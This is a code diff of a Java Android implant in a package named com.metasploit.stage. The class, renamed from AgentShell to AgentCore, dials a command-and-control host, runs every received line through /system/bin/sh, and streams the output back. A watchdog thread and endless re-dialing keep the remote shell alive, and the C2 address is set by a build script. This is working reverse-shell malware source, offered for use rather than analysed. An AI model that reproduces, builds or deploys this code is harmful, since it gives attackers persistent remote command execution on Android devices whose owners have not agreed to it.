@@ -1,21 +1,3 @@
-// AgentShell.java — persistent command bridge for Andro-DLS keeper.
-//
-// DESIGN for reliable 24/7 background operation on non-rooted Android 15:
-//
-//   WHY the old agent died: Android Doze/network changes silently kill the
-//   TCP socket (half-open). A naive readLine() then blocks 30-60s before the
-//   dial loop notices — long enough for a network flap to be fatal.
-//
-//   FIX: two threads cooperate:
-//     1. agent-shell  : dials C2, writes MAGIC, reads command lines, runs
-//                       each via a fresh /system/bin/sh -c, streams output.
-//     2. agent-watch : every 20s, does a non-blocking probe of the socket.
-//                       If the socket is dead/unresponsive (half-open), it
-//                       interrupts the dial-loop to force an immediate
-//                       re-dial — no 60s wait. This is the self-healing bit.
-//
-//   Re-dials with 5s-60s backoff. Strips \u0000 / \r from command lines
-//   (some tunnel paths inject a null terminator that `sh -c` rejects).
 package com.metasploit.stage;
 
 import java.io.InputStream;
@@ -25,11 +7,15 @@ import java.net.Socket;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
-public final class AgentShell {
-    static final String C2_HOST = "10.0.2.2";  // Host machine from emulator
-    static final int C2_PORT = 4445;
+/**
+ * Persistent TCP command shell — connects to C2, runs received commands
+ * via /system/bin/sh, streams output back. Re-dials forever with backoff.
+ */
+public final class AgentCore {
+    static final String C2_HOST = "192.0.2.1";  // ← replaced by build script
+    static final int C2_PORT = 11111;            // ← replaced by build script
     static final byte[] MAGIC = "__DLS_AGENT__\n".getBytes();
-    static final String MAGIC_STR = "__DLS_AGENT__\n";
+    static final String MAGIC_STR = "__DLS_AGENT__";
 
     private static volatile Socket CURRENT_SOCK = null;
     private static final java.util.concurrent.atomic.AtomicBoolean STARTED =
@@ -38,33 +24,32 @@ public final class AgentShell {
     public static void run() {
         if (!STARTED.compareAndSet(false, true)) return;
 
-        // ---- Watchdog thread: force quick re-dial on half-open sockets ----
+        // Watchdog: probe socket every 20s, force re-dial on half-open
         Thread watchdog = new Thread(new Runnable() {
             @Override public void run() {
                 while (true) {
                     try { Thread.sleep(20000); } catch (InterruptedException e) { break; }
                     Socket s = CURRENT_SOCK;
-                    if (s == null || s.isClosed()) continue;   // dial-loop owns reconnect
-                    // probe: empty write triggers EPIPE / RST if dead
+                    if (s == null || s.isClosed()) continue;
                     try {
                         s.setSoTimeout(2000);
-                        // a true keepalive ping the keeper ignores
                         synchronized(s) {
-                            try { s.getOutputStream().write(";;keepalive\n".getBytes()); s.getOutputStream().flush(); }
-                            catch (Exception ignored) {}
+                            try {
+                                s.getOutputStream().write(";;keepalive\n".getBytes());
+                                s.getOutputStream().flush();
+                            } catch (Exception ignored) {}
                         }
                         s.setSoTimeout(60000);
                     } catch (Exception e) {
-                        // socket dead — close to unblock readLine() & force re-dial
                         try { s.close(); } catch (Exception ignored) {}
                     }
                 }
             }
         }, "agent-watch");
-        watchdog.setDaemon(false);
+        watchdog.setDaemon(true);
         watchdog.start();
 
-        // ---- Dial + serve loop ----
+        // Dial + serve loop
         Thread t = new Thread(new Runnable() {
             @Override public void run() {
                 int fail = 0;
@@ -85,16 +70,15 @@ public final class AgentShell {
                 }
             }
         }, "agent-shell");
-        t.setDaemon(false);
+        t.setDaemon(true);
         t.start();
     }
 
-    /** Serve one connection: write MAGIC, then per-command exec loop. */
     private static void handle(final Socket sock) throws Exception {
         CURRENT_SOCK = sock;
         sock.getOutputStream().write(MAGIC);
         sock.getOutputStream().flush();
-        sock.setSoTimeout(0); // blocking reads; watchdog closes socket on stall
+        sock.setSoTimeout(0);
 
         BufferedReader socketIn = new BufferedReader(
             new InputStreamReader(sock.getInputStream(), "UTF-8"));
@@ -105,7 +89,7 @@ public final class AgentShell {
             line = line.trim().replace("\u0000", "").replace("\r", "");
             if (line.isEmpty()) continue;
             if (line.startsWith(";;keepalive")) continue;
-            if (line.equals(MAGIC_STR.trim())) continue;
+            if (line.equals(MAGIC_STR)) continue;
             try {
                 Process p = new ProcessBuilder("/system/bin/sh", "-c", line)
                     .redirectErrorStream(true).start();
